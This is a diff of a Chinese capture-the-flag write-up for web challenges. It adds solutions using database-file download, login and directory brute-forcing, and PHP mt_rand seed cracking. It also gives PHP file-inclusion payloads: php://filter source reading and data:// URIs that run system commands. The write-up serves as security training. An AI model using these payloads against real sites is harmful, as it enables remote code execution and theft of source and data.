@@ -384,9 +384,54 @@ var result=window.confirm(&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6
 <p>源文件中有加密代码，注释提示了</p>
 <pre><code>if($u===&#39;admin&#39; &amp;&amp; $p ===&#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#39;){              echo $flag;          }</code></pre><p>那我们提交就行了，但是我们在网页上提交的pazzword是经过了前端加密后的，所以抓包修改重发就行了</p>
 <h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200904152136.png" alt="web20.1"></p>
-<p>这个题是归到爆破了我记得，但是这种类型的年代久远了，用御剑和sqlmap都爆破不出来，刚好平台web题故障了，那就咕几天（美汁汁）</p>
+<p>这个题是归到爆破了我记得，但是这种类型的年代久远了，用御剑和sqlmap都爆破不出来，是在db目录下的一个mdb文件，/db/db.mdb，下载这个数据库文件后打开就有flag了</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200915200701.png" alt="web20.2"></p>
+<h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200915200836.png" alt="web21.1"></p>
+<p>爆破题，抓包发现传输的账号密码是经过base64加密后的</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200915202210.png" alt="web21.2"></p>
+<p>解出来是这样形式的：admin:admin</p>
+<p>下载题目给的压缩包，解压出字典，写脚本然后用burpsuit跑就行了</p>
 <h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200904153146.png" alt="web22.1"></p>
 <p>说是子域名爆破，但是我觉得就是flag.ctfer.com，你觉得呢…</p>
+<h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200921201534.png" alt="web23.1"></p>
+<p>在各位大佬的指导下搞出来的代码</p>
+<pre><code class="PHP">&lt;?php 
+error_reporting(0); 
+
+$a=&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;;
+for($i=0;$i&lt;36;$i++){
+    for($j=0;$j&lt;36;$j++){
+        $token=$a[$i].$a[$j];    
+        $token = md5($token); 
+        if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1)){ 
+            if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){ 
+                echo $a[$i].$a[$j];
+                exit(0);
+            } 
+        } 
+    }
+} 
+?&gt; </code></pre>
+<h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200917204607.png" alt="web24.1"></p>
+<p>PHP伪随机数</p>
+<pre><code>&lt;?php
+mt_srand(372619038);
+echo(mt_rand());
+?&gt;</code></pre><p>用PHP版本7.2.10运行，将得到的数字传入即可</p>
+<h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200917205952.png" alt></p>
+<p>r=1的时候rand=-1833303828</p>
+<p>mt_rand()=r-rand=1833303829</p>
+<p>然后kali运行脚本./php_mt_seed 1833303829</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200930213544.png" alt="web25.2"></p>
+<p>我用的是第一个php7.1.0+版本的种子然后</p>
+<pre><code>&lt;?php
+mt_srand(399933415);
+echo mt_rand().&quot;\n&quot;;
+echo mt_rand()+mt_rand();</code></pre><p>返回1833303829 1800730406</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200930213708.png" alt="web25.3"></p>
+<p>设置r= 和token=</p>
+<h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200930201911.png" alt="web26.1"></p>
+<p>爆破pass</p>
 <h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903224458.png" alt="web27.1"></p>
 <p>题目是个正方的教务管理系统，有录取名单和学生学籍信息查询系统两个功能</p>
 <p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903224628.png" alt="web27.2"></p>
@@ -401,7 +446,14 @@ var result=window.confirm(&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6
             print(card)</code></pre><p>然后拿着姓名+身份证去学籍信息查询系统爆破，得到正确的身份证号码，然后会弹窗提示学号和默认密码（身份证号）</p>
 <p>登录得到flag</p>
 <p>（还有师傅说去在线生成身份证的网站上输入姓名能直接找到，这比我还狠啊…）</p>
-
+<h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200930213906.png" alt="web28.1"></p>
+<p>访问之后url是这样的/0/1/2.txt，然后手动尝试访问/0/1.txt之后url被重定向到/0/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/2.txt</p>
+<p>刚开始我想的是爆破0和1的各种组合目录，最后啥也爆破不出来，看师傅们的wp才知道是爆破/0-100/0-100/</p>
+<p>爆破/0-100/0-100/就行</p>
+<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p>
+<p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJubCAqIik/Pg==</p>
+<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3>
         </div>
         <!-- .entry-content -->
         
@@ -480,7 +532,7 @@ var result=window.confirm(&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <input type="text" class="ins-search-input" placeholder="Type something..."/>
             <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="ins-section-wrapper">
@@ -492,10 +544,10 @@ var result=window.confirm(&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6
 (function (window) {
     var INSIGHT_CONFIG = {
         TRANSLATION: {
-            POSTS: '文章',
-            // PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
+            POSTS: 'Posts',
+            // PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
         },
         ROOT_URL: '/',
         CONTENT_URL: '/content.json',
